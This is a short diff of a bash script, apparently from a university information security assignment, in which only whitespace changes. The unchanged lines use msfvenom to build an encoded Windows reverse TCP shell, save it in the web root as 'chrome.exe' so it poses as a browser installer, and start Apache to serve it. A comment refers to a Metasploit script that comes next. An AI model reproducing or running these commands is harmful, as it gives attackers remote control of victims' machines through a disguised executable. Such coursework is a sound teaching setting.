@@ -2,8 +2,8 @@
  ###########################################
 #	Pontificia Universidad Javeriana Cali 	#
 #	Inguieneria de Sistemas y Computacion 	#
-#	Seguridad Informatica				  	#
-#	Estudiante:						  		#
+#	Seguridad Informatica					#
+#	Estudiante:								#
 #		Santiago Florian Bustamante			#
 #											#
 #	20 de Septiembre del 2020				#
@@ -52,7 +52,7 @@
 	LPORT=444
 	echo "IP LOCAL: "$LHOST" PUERTO: "$LPORT
 	msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00" -e x86/shikata_ga_nai -f exe -o /var/www/html/chrome.exe
-
+#
 	service apache2 start
 #	
 #	Crea el script que se ejecutara en metasplot	
